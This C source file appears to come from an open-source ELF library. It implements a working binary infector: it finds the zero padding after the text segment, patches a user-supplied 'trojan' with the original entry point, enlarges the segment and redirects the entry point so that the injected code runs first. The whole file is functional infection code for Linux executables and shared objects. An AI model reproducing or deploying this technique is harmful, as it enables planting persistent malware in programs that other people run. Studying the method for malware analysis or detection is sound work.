/**
 *  MIT License
 *
 *  Copyright (c) 2021 Carlos Carvalho
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 */

#include "common.h"
#include "utils.h"
#include "log.h"
#include "elfo.h"
#include "infect.h"
#include <assert.h>

/**
 *  Check if the room we find to inject user's trojan
 *  is empty (zeroes)
 */
static bool _inf_check_padding(unsigned char *buf, size_t len) {
    unsigned char zeroes[len];
    memset(zeroes, 0, len);
    if (!memcmp(zeroes, buf, len))
        return true;
    return false;
}

/**
 * Find the magic address that will
 * be replaced by valid one
 */
static long *_inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
{
    uint8_t *ptr = trojan;
    for (int i=0 ; i < len ; ++i) {
        long curr = *((long *)&ptr[i]);
        /** is it the same? */
        if (!(match ^ curr))
            return (long*)&ptr[i];
    }
    return NULL;
}

/** Locate and set injection offsets */
static elf_off_t _inf_set_pad(infect_t *inf, elf_phdr_t *text, elf_phdr_t *data) {
    inf->lsb.target_offset = text->p_offset + text->p_filesz;
    /** If ELF is .so = ehdr->e_type */
    inf->lsb.lsb_so_addr = inf->lsb.target_offset;
    /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
    inf->lsb.lsb_exec_addr = text->p_vaddr + text->p_filesz;

    /** Total padding size (zeroes) between .text and .data */
    return (data->p_offset - inf->lsb.lsb_so_addr);
}


infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m,
        long magic, struct mapped_file *map) {
    ASSERT_ARG_RET_NULL(elfo);
    ASSERT_CON_RET_NULL(m == F_RW);
    ASSERT_CON_RET_NULL(map);

    long *magic_ptr = _inf_get_inf_magik((uint8_t*)map->heap,
            map->st.st_size, magic);
    if (!magic_ptr) {
        log_error("Magic not found\n");
        return NULL;
    }

    infect_t *inf = scalloc(1, sizeof(infect_t));
    inf->elfo = elfo;
    inf->magic_ptr = magic_ptr;
    inf->src_bin_size = map->st.st_size;
    inf->trojan = map->heap;

    return inf;
}

elf_off_t inf_scan_segment(infect_t *inf) {
    ASSERT_ARG_RET_VAL(inf && inf->elfo, 0);

    bool pass_check = false;

    int nr = inf->elfo->phmap[LAZY_PT_LOAD].nr;
    if (nr != 2) {
        log_error("Wait!? %d loadable sections?!\n", nr);
        return (elf_off_t)0;
    }

    elf_phdr_t *text = NULL;
    elf_phdr_t *data = NULL;
    int idx0 = inf->elfo->phmap[LAZY_PT_LOAD].map[0];
    int idx1 = inf->elfo->phmap[LAZY_PT_LOAD].map[1];
    elf_word_t flags0 = inf->elfo->phdrs[idx0]->p_flags;
    elf_word_t flags1 = inf->elfo->phdrs[idx1]->p_flags;

    if (flags0 == (PF_R|PF_X) && flags1 == (PF_R|PF_W)) { /** .text,.data */
        text = inf->elfo->phdrs[idx0];
        data = inf->elfo->phdrs[idx1];
    } else if (flags0 == (PF_R|PF_W) && flags1 == (PF_R|PF_X)) { /** .data,.text */
        text = inf->elfo->phdrs[idx1];
        data = inf->elfo->phdrs[idx0];
    }

    if (!text) {
        log_error("Wait!? Unexpected loadable segment\n");
        return (elf_off_t)0;
    }

    elf_off_t len = _inf_set_pad(inf, text, data);
    if (len < inf->src_bin_size) {
        log_error("No available space for infection, not written\n");
        return false;
    }

    /** must be only zeroes :) */
    if (_inf_check_padding((unsigned char*)inf->elfo->mapaddr +
                inf->lsb.target_offset, len) == true) {
        /** Update to the new mem & file size */
        text->p_memsz = text->p_memsz + inf->src_bin_size;
        text->p_filesz = text->p_filesz + inf->src_bin_size;
        pass_check = true;
    } else {
        log_error("Error: Invalid padding - not all zeroes\n");
        dump_buff_hex((unsigned char *)inf->elfo->mapaddr + inf->lsb.target_offset, len);
        printf("\n");
    }

    return (pass_check ? len : 0);
}

bool inf_load_and_patch(infect_t *inf) {
    ASSERT_CON_RET_FALSE(inf && inf->elfo);

    elf_ehdr_t *ehdr = inf->elfo->ehdr;

    elf_off_t curr_sct_offset = 0;
    elf_shdr_t **shdrs = inf->elfo->shdrs;

    /** Save original entry point and re-write new one to ehdr */
    inf->lsb.o_entry = ehdr->e_entry;
    if (ehdr->e_type == ET_EXEC)
        ehdr->e_entry = inf->lsb.lsb_exec_addr;
    else if (ehdr->e_type == ET_DYN)
        ehdr->e_entry = inf->lsb.lsb_so_addr;

    for (int i = 0; i < SHNUM(inf->elfo); ++i, (*shdrs)++) {
        elf_shdr_t *shdr = *shdrs;
        curr_sct_offset = shdr->sh_offset + shdr->sh_size;

        if (inf->lsb.target_offset == curr_sct_offset) {
            shdr->sh_size = shdr->sh_size + inf->src_bin_size;
            break;
        }
    }

    /** All good! */
    *(inf->magic_ptr) = inf->lsb.o_entry;
    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->lsb.target_offset;
    memcpy(dest, inf->trojan, inf->src_bin_size);

    return true;
}

